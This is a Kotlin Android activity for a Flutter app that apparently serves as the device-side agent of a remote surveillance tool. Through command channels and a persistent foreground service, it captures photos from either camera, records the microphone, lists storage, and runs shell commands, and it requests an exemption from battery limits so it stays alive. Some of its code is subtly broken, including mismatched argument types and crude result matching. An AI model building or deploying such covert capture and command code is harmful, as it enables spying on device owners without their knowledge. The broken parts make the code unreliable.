// android/app/src/main/kotlin/com/example/kem/MainActivity.kt
package com.example.kem

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.util.Log
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.ContextCompat
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.lifecycle.ProcessLifecycleOwner
import com.google.common.util.concurrent.ListenableFuture
import org.json.JSONObject
import java.util.concurrent.ExecutionException
import android.content.ComponentName
import android.content.ServiceConnection
import android.os.IBinder
import kotlinx.coroutines.*

class MainActivity : FlutterActivity(), NativeCommandService.CommandCallback {
    private val CAMERA_CHANNEL_NAME = "com.example.kem/camera"
    private val FILES_CHANNEL_NAME = "com.example.kem/files"
    private val AUDIO_CHANNEL_NAME = "com.example.kem/audio"
    private val BATTERY_CHANNEL_NAME = "com.example.kem/battery"
    private val NATIVE_COMMANDS_CHANNEL = "com.example.kem/native_commands"
    private val TAG = "MainActivityEthical"

    private lateinit var cameraExecutor: ExecutorService
    private var imageCapture: ImageCapture? = null
    private var cameraProvider: ProcessCameraProvider? = null
    private var mediaRecorder: MediaRecorder? = null
    
    // Native service integration
    private var nativeCommandService: NativeCommandService? = null
    private var isServiceBound = false
    private val pendingMethodResults = mutableMapOf<String, MethodChannel.Result>()
    
    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(className: ComponentName, service: IBinder) {
            val binder = service as NativeCommandService.LocalBinder
            nativeCommandService = binder.getService()
            nativeCommandService?.setCommandCallback(this@MainActivity)
            isServiceBound = true
            Log.d(TAG, "Native command service connected")
        }

        override fun onServiceDisconnected(arg0: ComponentName) {
            nativeCommandService = null
            isServiceBound = false
            Log.d(TAG, "Native command service disconnected")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Start and bind to native command service
        startNativeCommandService()
        bindNativeCommandService()
        
        // Request battery optimization exemption on app start
        Log.d(TAG, "onCreate: Requesting battery optimization exemption")
        requestIgnoreBatteryOptimizations()
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        cameraExecutor = Executors.newSingleThreadExecutor()
        Log.d(TAG, "FlutterEngine configured and cameraExecutor initialized.")

        // Battery Channel
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BATTERY_CHANNEL_NAME).setMethodCallHandler { call, result ->
            when (call.method) {
                "requestIgnoreBatteryOptimizations" -> {
                    Log.d(TAG, "MethodChannel: 'requestIgnoreBatteryOptimizations' called from Flutter")
                    requestIgnoreBatteryOptimizations()
                    result.success(null)
                }
                "isIgnoringBatteryOptimizations" -> {
                    val isIgnoring = isIgnoringBatteryOptimizations()
                    Log.d(TAG, "MethodChannel: 'isIgnoringBatteryOptimizations' called, result: $isIgnoring")
                    result.success(isIgnoring)
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $BATTERY_CHANNEL_NAME.")
                    result.notImplemented()
                }
            }
        }

        // Native Commands Channel - NEW: High-level command interface
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_COMMANDS_CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "executeCommand" -> {
                    val command = call.argument<String>("command")
                    val argsMap = call.argument<Map<String, Any>>("args") ?: emptyMap()
                    
                    if (command != null) {
                        executeCommandWithFallback(command, argsMap, result)
                    } else {
                        result.error("INVALID_ARGS", "Command parameter is required", null)
                    }
                }
                "isNativeServiceAvailable" -> {
                    result.success(isServiceBound && nativeCommandService != null)
                }
                "forceNativeExecution" -> {
                    val command = call.argument<String>("command")
                    val argsMap = call.argument<Map<String, Any>>("args") ?: emptyMap()
                    
                    if (command != null) {
                        forceNativeExecution(command, argsMap, result)
                    } else {
                        result.error("INVALID_ARGS", "Command parameter is required", null)
                    }
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $NATIVE_COMMANDS_CHANNEL.")
                    result.notImplemented()
                }
            }
        }

        // Camera Channel - Enhanced with fallback
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CAMERA_CHANNEL_NAME).setMethodCallHandler { call, result ->
            when (call.method) {
                "takePicture" -> {
                    val lensDirectionArg = call.argument<String>("lensDirection") ?: "back"
                    Log.d(TAG, "MethodChannel: 'takePicture' called with lens: $lensDirectionArg")
                    
                    if (allPermissionsGranted()) {
                        // Try Flutter implementation first, with native fallback
                        val args = mapOf("camera" to lensDirectionArg)
                        executeCommandWithFallback(NativeCommandService.CMD_TAKE_PICTURE, args, result)
                    } else {
                        Log.w(TAG, "MethodChannel: Camera permissions not granted for takePicture.")
                        result.error("PERMISSION_DENIED", "Camera permissions not granted.", null)
                    }
                }
                "disposeCamera" -> {
                    Log.d(TAG, "MethodChannel: 'disposeCamera' called.")
                    disposeCameraResources()
                    result.success(null)
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $CAMERA_CHANNEL_NAME.")
                    result.notImplemented()
                }
            }
        }

        // Files Channel - Enhanced with fallback
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, FILES_CHANNEL_NAME).setMethodCallHandler { call, result ->
            when (call.method) {
                "listFiles" -> {
                    val path = call.argument<String>("path") ?: context.filesDir.absolutePath
                    Log.d(TAG, "MethodChannel: 'listFiles' called for path: $path")
                    
                    val args = mapOf("path" to path)
                    executeCommandWithFallback(NativeCommandService.CMD_LIST_FILES, args, result)
                }
                "executeShellCommand" -> {
                    val command = call.argument<String>("command")
                    val commandArgsFromDart = call.argument<List<String>>("args") ?: emptyList()
                    Log.d(TAG, "MethodChannel: 'executeShellCommand' called: $command with args: $commandArgsFromDart")
                    
                    if (command != null) {
                        val args = mapOf(
                            "command_name" to command,
                            "command_args" to commandArgsFromDart
                        )
                        executeCommandWithFallback(NativeCommandService.CMD_EXECUTE_SHELL, args, result)
                    } else {
                        result.error("INVALID_ARGS", "Command parameter is required", null)
                    }
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $FILES_CHANNEL_NAME.")
                    result.notImplemented()
                }
            }
        }

        // Audio Channel - Enhanced with fallback
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, AUDIO_CHANNEL_NAME).setMethodCallHandler { call, result ->
            when (call.method) {
                "recordAudio" -> {
                    val duration = call.argument<Int>("duration") ?: 10
                    val quality = call.argument<String>("quality") ?: "medium"
                    Log.d(TAG, "MethodChannel: 'recordAudio' called for ${duration}s with quality: $quality")
                    
                    if (hasAudioPermission()) {
                        val args = mapOf(
                            "duration" to duration,
                            "quality" to quality
                        )
                        executeCommandWithFallback(NativeCommandService.CMD_RECORD_AUDIO, args, result)
                    } else {
                        Log.w(TAG, "MethodChannel: Audio recording permission not granted.")
                        result.error("PERMISSION_DENIED", "Audio recording permission not granted.", null)
                    }
                }
                "disposeAudio" -> {
                    Log.d(TAG, "MethodChannel: 'disposeAudio' called.")
                    stopAndReleaseMediaRecorder()
                    result.success(null)
                }
                else -> {
                    Log.w(TAG, "MethodChannel: Method '${call.method}' not implemented on $AUDIO_CHANNEL_NAME.")
                    result.notImplemented()
                }
            }
        }
    }

    /**
     * Execute command with intelligent fallback mechanism
     * 1. Try Flutter/UI implementation first
     * 2. If that fails or times out, fall back to native service
     */
    private fun executeCommandWithFallback(
        command: String, 
        args: Map<String, Any>, 
        result: MethodChannel.Result
    ) {
        val requestId = generateRequestId()
        pendingMethodResults[requestId] = result
        
        Log.d(TAG, "Executing command with fallback: $command (ID: $requestId)")
        
        // Try Flutter implementation first with timeout
        CoroutineScope(Dispatchers.Main).launch {
            var flutterSuccess = false
            
            try {
                flutterSuccess = when (command) {
                    NativeCommandService.CMD_TAKE_PICTURE -> {
                        val lensDirection = args["camera"] as? String ?: "back"
                        tryFlutterTakePicture(lensDirection, requestId)
                    }
                    NativeCommandService.CMD_RECORD_AUDIO -> {
                        val duration = args["duration"] as? Int ?: 10
                        val quality = args["quality"] as? String ?: "medium"
                        tryFlutterRecordAudio(duration, quality, requestId)
                    }
                    NativeCommandService.CMD_LIST_FILES -> {
                        val path = args["path"] as? String ?: "/storage/emulated/0"
                        tryFlutterListFiles(path, requestId)
                    }
                    NativeCommandService.CMD_EXECUTE_SHELL -> {
                        val commandName = args["command_name"] as? String ?: ""
                        val commandArgs = args["command_args"] as? List<String> ?: emptyList()
                        tryFlutterExecuteShell(commandName, commandArgs, requestId)
                    }
                    else -> false
                }
            } catch (e: Exception) {
                Log.w(TAG, "Flutter implementation failed for $command: $e")
                flutterSuccess = false
            }
            
            // If Flutter implementation failed, fall back to native
            if (!flutterSuccess) {
                Log.d(TAG, "Falling back to native implementation for: $command")
                forceNativeExecution(command, args, requestId)
            }
        }
    }

    /**
     * Force native execution without Flutter fallback
     */
    private fun forceNativeExecution(
        command: String, 
        args: Map<String, Any>, 
        result: MethodChannel.Result
    ) {
        val requestId = if (result is String) result else generateRequestId()
        if (result !is String) {
            pendingMethodResults[requestId] = result
        }
        
        if (!isServiceBound || nativeCommandService == null) {
            Log.e(TAG, "Native service not available for command: $command")
            completeRequest(requestId, false, JSONObject().apply {
                put("error", "Native service not available")
            })
            return
        }
        
        try {
            val argsJson = JSONObject()
            args.forEach { (key, value) ->
                argsJson.put(key, value)
            }
            
            Log.d(TAG, "Executing native command: $command with args: $argsJson")
            NativeCommandService.executeCommand(this, command, argsJson)
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to execute native command: $command", e)
            completeRequest(requestId, false, JSONObject().apply {
                put("error", "Failed to execute native command: ${e.message}")
            })
        }
    }

    // Flutter implementation methods with timeout
    private suspend fun tryFlutterTakePicture(lensDirection: String, requestId: String): Boolean {
        return withTimeoutOrNull(10000) { // 10 second timeout
            try {
                startCameraAndTakePhoto(lensDirection, object : MethodChannel.Result {
                    override fun success(result: Any?) {
                        val resultJson = JSONObject().apply {
                            put("path", result as? String ?: "")
                            put("method", "flutter")
                        }
                        completeRequest(requestId, true, resultJson)
                    }
                    
                    override fun error(errorCode: String, errorMessage: String?, errorDetails: Any?) {
                        throw Exception("$errorCode: $errorMessage")
                    }
                    
                    override fun notImplemented() {
                        throw Exception("Method not implemented")
                    }
                })
                true
            } catch (e: Exception) {
                Log.w(TAG, "Flutter takePicture failed", e)
                false
            }
        } ?: false
    }
    
    private suspend fun tryFlutterRecordAudio(duration: Int, quality: String, requestId: String): Boolean {
        return withTimeoutOrNull((duration + 5) * 1000L) { // duration + 5 seconds timeout
            try {
                recordAudioInternal(duration, quality, object : MethodChannel.Result {
                    override fun success(result: Any?) {
                        val resultJson = JSONObject().apply {
                            put("path", result as? String ?: "")
                            put("method", "flutter")
                        }
                        completeRequest(requestId, true, resultJson)
                    }
                    
                    override fun error(errorCode: String, errorMessage: String?, errorDetails: Any?) {
                        throw Exception("$errorCode: $errorMessage")
                    }
                    
                    override fun notImplemented() {
                        throw Exception("Method not implemented")
                    }
                })
                true
            } catch (e: Exception) {
                Log.w(TAG, "Flutter recordAudio failed", e)
                false
            }
        } ?: false
    }
    
    private suspend fun tryFlutterListFiles(path: String, requestId: String): Boolean {
        return withTimeoutOrNull(5000) { // 5 second timeout
            try {
                val directory = File(path)
                if (!directory.exists() || !directory.isDirectory) {
                    throw Exception("Invalid directory path: $path")
                }
                
                val filesList = directory.listFiles()?.mapNotNull { file ->
                    mapOf(
                        "name" to file.name,
                        "path" to file.absolutePath,
                        "isDirectory" to file.isDirectory,
                        "size" to file.length(),
                        "lastModified" to file.lastModified()
                    )
                } ?: emptyList()
                
                val resultJson = JSONObject().apply {
                    put("files", JSONObject(mapOf("files" to filesList, "path" to directory.absolutePath)))
                    put("method", "flutter")
                }
                
                completeRequest(requestId, true, resultJson)
                true
            } catch (e: Exception) {
                Log.w(TAG, "Flutter listFiles failed", e)
                false
            }
        } ?: false
    }
    
    private suspend fun tryFlutterExecuteShell(command: String, args: List<String>, requestId: String): Boolean {
        return withTimeoutOrNull(10000) { // 10 second timeout
            try {
                val whiteListedCommands = mapOf(
                    "pwd" to listOf("/system/bin/pwd"),
                    "ls" to listOf("/system/bin/ls")
                )

                if (!whiteListedCommands.containsKey(command)) {
                    throw Exception("Command not whitelisted: $command")
                }

                val fullCommandArray = whiteListedCommands[command]!!.toMutableList()
                if (command == "ls" && args.isNotEmpty()) {
                    val safeArgs = args.filter { arg ->
                        !arg.contains(";") && !arg.contains("|") && !arg.contains("&") && !arg.contains("`")
                    }
                    fullCommandArray.addAll(safeArgs)
                }

                val process = ProcessBuilder(fullCommandArray).start()
                val stdout = process.inputStream.bufferedReader().use { it.readText() }
                val stderr = process.errorStream.bufferedReader().use { it.readText() }
                val exited = process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
                
                if (!exited) {
                    process.destroyForcibly()
                    throw Exception("Command execution timed out")
                }
                
                val exitCode = process.exitValue()
                val resultJson = JSONObject().apply {
                    put("stdout", stdout)
                    put("stderr", stderr)
                    put("exitCode", exitCode)
                    put("method", "flutter")
                }
                
                completeRequest(requestId, true, resultJson)
                true
            } catch (e: Exception) {
                Log.w(TAG, "Flutter executeShell failed", e)
                false
            }
        } ?: false
    }

    // Command callback from native service
    override fun onCommandResult(command: String, success: Boolean, result: JSONObject) {
        Log.d(TAG, "Native command result: $command, success: $success")
        
        // Find pending request for this command result
        // This is a simplified approach - in production you might want a more sophisticated mapping
        val requestId = pendingMethodResults.keys.firstOrNull()
        if (requestId != null) {
            result.put("method", "native")
            completeRequest(requestId, success, result)
        }
    }

    private fun completeRequest(requestId: String, success: Boolean, result: JSONObject) {
        val methodResult = pendingMethodResults.remove(requestId)
        if (methodResult != null) {
            CoroutineScope(Dispatchers.Main).launch {
                if (success) {
                    // Convert JSONObject to Map for Flutter
                    val resultMap = mutableMapOf<String, Any>()
                    result.keys().forEach { key ->
                        resultMap[key] = result.get(key)
                    }
                    methodResult.success(resultMap)
                } else {
                    val error = result.optString("error", "Unknown error")
                    methodResult.error("COMMAND_FAILED", error, null)
                }
            }
        }
    }

    private fun generateRequestId(): String {
        return "req_${System.currentTimeMillis()}_${(Math.random() * 1000).toInt()}"
    }

    private fun startNativeCommandService() {
        val intent = Intent(this, NativeCommandService::class.java)
        startForegroundService(intent)
        Log.d(TAG, "Started native command service")
    }
    
    private fun bindNativeCommandService() {
        val intent = Intent(this, NativeCommandService::class.java)
        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)
        Log.d(TAG, "Binding to native command service")
    }

    // [Keep all existing methods from original MainActivity.kt]
    // This includes: startCameraAndTakePhoto, takePhotoInternal, recordAudioInternal, 
    // stopAndReleaseMediaRecorder, createFile, createAudioFile, allPermissionsGranted,
    // hasAudioPermission, disposeCameraResources, requestIgnoreBatteryOptimizations,
    // isIgnoringBatteryOptimizations

    private fun startCameraAndTakePhoto(lensDirection: String, channelResult: MethodChannel.Result) {
        Log.d(TAG, "startCameraAndTakePhoto: Initializing for lens: $lensDirection")
        val cameraProviderFuture: ListenableFuture<ProcessCameraProvider> = ProcessCameraProvider.getInstance(this.applicationContext)

        cameraProviderFuture.addListener({
            try {
                cameraProvider = cameraProviderFuture.get()
                
                val cameraSelector = if (lensDirection.equals("front", ignoreCase = true)) {
                    CameraSelector.DEFAULT_FRONT_CAMERA
                } else {
                    CameraSelector.DEFAULT_BACK_CAMERA
                }
                Log.d(TAG, "startCameraAndTakePhoto: CameraSelector created for $lensDirection.")

                try {
                    if (cameraProvider == null) {
                        Log.e(TAG, "startCameraAndTakePhoto: CameraProvider is null after future.get().")
                        channelResult.error("CAMERA_PROVIDER_NULL", "CameraProvider became null unexpectedly.", null)
                        return@addListener
                    }
                    if (!cameraProvider!!.hasCamera(cameraSelector)) {
                        Log.e(TAG, "startCameraAndTakePhoto: No camera found for selector: $lensDirection")
                        channelResult.error("NO_CAMERA_FOUND", "No camera available for specified lens direction.", null)
                        return@addListener
                    }
                    Log.d(TAG, "startCameraAndTakePhoto: Camera exists for selector: $lensDirection.")
                } catch (e: Exception) {
                    Log.e(TAG, "startCameraAndTakePhoto: Error checking camera availability for $lensDirection", e)
                    channelResult.error("CAMERA_CHECK_ERROR", "Failed to check camera availability: ${e.message}", null)
                    return@addListener
                }

                imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()
                Log.d(TAG, "startCameraAndTakePhoto: ImageCapture instance created.")

                Log.d(TAG, "startCameraAndTakePhoto: Unbinding all use cases before rebinding.")
                cameraProvider?.unbindAll()

                Log.d(TAG, "startCameraAndTakePhoto: Attempting to bind camera to ProcessLifecycleOwner.")
                cameraProvider?.bindToLifecycle(
                    ProcessLifecycleOwner.get(),
                    cameraSelector,
                    imageCapture
                )
                Log.d(TAG, "startCameraAndTakePhoto: Camera bound to ProcessLifecycleOwner successfully for lens: $lensDirection.")
                
                takePhotoInternal(channelResult)

            } catch (exc: ExecutionException) {
                Log.e(TAG, "startCameraAndTakePhoto: CameraX setup failed (ExecutionException)", exc)
                channelResult.error("CAMERA_SETUP_FAILED_EXEC", "CameraX setup failed: ${exc.cause?.message ?: exc.message}", exc.localizedMessage)
            } catch (exc: InterruptedException) {
                Thread.currentThread().interrupt()
                Log.e(TAG, "startCameraAndTakePhoto: CameraX setup interrupted (InterruptedException)", exc)
                channelResult.error("CAMERA_SETUP_INTERRUPTED", "CameraX setup interrupted: ${exc.message}", exc.localizedMessage)
            } catch (ise: IllegalStateException) {
                Log.e(TAG, "startCameraAndTakePhoto: CameraX setup failed (IllegalStateException).", ise)
                channelResult.error("CAMERA_ILLEGAL_STATE", "Camera setup failed due to illegal state: ${ise.message}", ise.localizedMessage)
            } catch (exc: Exception) {
                Log.e(TAG, "startCameraAndTakePhoto: CameraX setup failed (General Exception)", exc)
                channelResult.error("CAMERA_SETUP_UNKNOWN_ERROR", "An unknown error occurred during camera setup: ${exc.message}", exc.localizedMessage)
            }
        }, ContextCompat.getMainExecutor(this.applicationContext))
    }

    private fun takePhotoInternal(channelResult: MethodChannel.Result) {
        val currentImageCapture = this.imageCapture ?: run {
            Log.e(TAG, "takePhotoInternal: ImageCapture is null. Camera not initialized properly or unbound.")
            channelResult.error("CAMERA_NOT_INITIALIZED", "ImageCapture is null. Camera might not be bound or was disposed.", null)
            return
        }

        val photoFile = createFile(applicationContext)
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        Log.d(TAG, "takePhotoInternal: Attempting to take picture. Output file: ${photoFile.absolutePath}")

        currentImageCapture.takePicture(
            outputOptions,
            ContextCompat.getMainExecutor(this.applicationContext),
            object : ImageCapture.OnImageSavedCallback {
                override fun onError(exc: ImageCaptureException) {
                    Log.e(TAG, "takePhotoInternal: Photo capture failed: ${exc.message} (Error Code: ${exc.imageCaptureError})", exc)
                    channelResult.error("CAPTURE_FAILED", "Photo capture failed: ${exc.message}", exc.imageCaptureError.toString())
                }

                override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                    val savedPath = photoFile.absolutePath
                    Log.d(TAG, "takePhotoInternal: Photo capture succeeded. Saved to: $savedPath")
                    channelResult.success(savedPath)
                }
            }
        )
    }

    private fun recordAudioInternal(duration: Int, quality: String, channelResult: MethodChannel.Result) {
        try {
            stopAndReleaseMediaRecorder() // Clean up any existing recorder
            
            val audioFile = createAudioFile(applicationContext, "3gp")
            
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                
                // Set quality based on parameter
                when (quality.lowercase()) {
                    "high" -> {
                        setAudioSamplingRate(44100)
                        setAudioEncodingBitRate(128000)
                    }
                    "medium" -> {
                        setAudioSamplingRate(22050)
                        setAudioEncodingBitRate(64000)
                    }
                    "low" -> {
                        setAudioSamplingRate(8000)
                        setAudioEncodingBitRate(32000)
                    }
                }
                
                setOutputFile(audioFile.absolutePath)
                
                try {
                    prepare()
                    start()
                    Log.d(TAG, "recordAudioInternal: Started recording to ${audioFile.absolutePath}")
                    
                    // Schedule stop after duration
                    cameraExecutor.execute {
                        try {
                            Thread.sleep((duration * 1000).toLong())
                            stopAndReleaseMediaRecorder()
                            Log.d(TAG, "recordAudioInternal: Recording completed: ${audioFile.absolutePath}")
                            channelResult.success(audioFile.absolutePath)
                        } catch (e: InterruptedException) {
                            Log.e(TAG, "recordAudioInternal: Recording interrupted", e)
                            stopAndReleaseMediaRecorder()
                            channelResult.error("RECORDING_INTERRUPTED", "Audio recording was interrupted", null)
                        }
                    }
                    
                } catch (e: IOException) {
                    Log.e(TAG, "recordAudioInternal: Failed to prepare MediaRecorder", e)
                    stopAndReleaseMediaRecorder()
                    channelResult.error("RECORDING_FAILED", "Failed to prepare audio recording: ${e.message}", null)
                }
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "recordAudioInternal: Unexpected error", e)
            stopAndReleaseMediaRecorder()
            channelResult.error("RECORDING_ERROR", "Unexpected error during audio recording: ${e.message}", null)
        }
    }

    private fun stopAndReleaseMediaRecorder() {
        mediaRecorder?.apply {
            try {
                stop()
                reset()
                release()
                Log.d(TAG, "stopAndReleaseMediaRecorder: MediaRecorder stopped and released")
            } catch (e: Exception) {
                Log.e(TAG, "stopAndReleaseMediaRecorder: Error stopping MediaRecorder", e)
            }
        }
        mediaRecorder = null
    }

    private fun createFile(context: Context, fileExtension: String = "jpg"): File {
        val sdf = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US)
        val cacheDirToUse = context.externalCacheDir ?: context.cacheDir
        
        val imageDir = File(cacheDirToUse, "EthicalScannerImages").apply {
            if (!exists()) {
                val dirMade = mkdirs()
                if (dirMade) Log.d(TAG, "Image directory created at ${this.absolutePath}")
                else Log.e(TAG, "Failed to create image directory at ${this.absolutePath}")
            }
        }

        val fileName = "IMG_${sdf.format(Date())}.$fileExtension"
        val photoFile = File(imageDir, fileName)
        Log.d(TAG, "createFile: Photo file path: ${photoFile.absolutePath}")
        return photoFile
    }

    private fun createAudioFile(context: Context, fileExtension: String = "3gp"): File {
        val sdf = SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US)
        val cacheDirToUse = context.externalCacheDir ?: context.cacheDir
        
        val audioDir = File(cacheDirToUse, "EthicalScannerAudio").apply {
            if (!exists()) {
                val dirMade = mkdirs()
                if (dirMade) Log.d(TAG, "Audio directory created at ${this.absolutePath}")
                else Log.e(TAG, "Failed to create audio directory at ${this.absolutePath}")
            }
        }

        val fileName = "AUD_${sdf.format(Date())}.$fileExtension"
        val audioFile = File(audioDir, fileName)
        Log.d(TAG, "createAudioFile: Audio file path: ${audioFile.absolutePath}")
        return audioFile
    }

    private fun allPermissionsGranted(): Boolean {
        val cameraPermissionGranted = ContextCompat.checkSelfPermission(baseContext, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
        if (!cameraPermissionGranted) {
            Log.w(TAG, "allPermissionsGranted: CAMERA permission is NOT granted.")
        }
        return cameraPermissionGranted
    }

    private fun hasAudioPermission(): Boolean {
        val audioPermissionGranted = ContextCompat.checkSelfPermission(baseContext, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        if (!audioPermissionGranted) {
            Log.w(TAG, "hasAudioPermission: RECORD_AUDIO permission is NOT granted.")
        }
        return audioPermissionGranted
    }

    private fun disposeCameraResources() {
        Log.d(TAG, "disposeCameraResources: Unbinding all camera use cases.")
        try {
            cameraProvider?.let {
                it.unbindAll()
                Log.d(TAG, "disposeCameraResources: CameraProvider.unbindAll() called successfully.")
            } ?: Log.w(TAG, "disposeCameraResources: cameraProvider was null, cannot unbind.")
        } catch (e: Exception) {
            Log.e(TAG, "disposeCameraResources: Error during cameraProvider.unbindAll()", e)
        }
        imageCapture = null
        Log.d(TAG, "disposeCameraResources: imageCapture set to null.")
    }

    // Battery optimization methods
    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent()
            val packageName = packageName
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                Log.d(TAG, "requestIgnoreBatteryOptimizations: Requesting battery optimization exemption")
                intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } else {
                Log.d(TAG, "requestIgnoreBatteryOptimizations: Battery optimization already disabled")
            }
        } else {
            Log.d(TAG, "requestIgnoreBatteryOptimizations: Not needed on Android version < 23")
        }
    }

    // Helper method to check if battery optimizations are already disabled
    private fun isIgnoringBatteryOptimizations(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            val isIgnoring = pm.isIgnoringBatteryOptimizations(packageName)
            Log.d(TAG, "isIgnoringBatteryOptimizations: $isIgnoring")
            isIgnoring
        } else {
            Log.d(TAG, "isIgnoringBatteryOptimizations: true (no battery optimization on older versions)")
            true // No battery optimization on older versions
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "MainActivity onDestroy called.")
        super.onDestroy()
        
        // Unbind from service
        if (isServiceBound) {
            unbindService(serviceConnection)
            isServiceBound = false
        }
        
        disposeCameraResources()
        stopAndReleaseMediaRecorder()
        if (::cameraExecutor.isInitialized && !cameraExecutor.isShutdown) {
            Log.d(TAG, "MainActivity onDestroy: Shutting down cameraExecutor.")
            cameraExecutor.shutdown()
        }
        Log.d(TAG, "MainActivity onDestroy completed.")
    }

    companion object {
        private val REQUIRED_PERMISSIONS = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
    }
}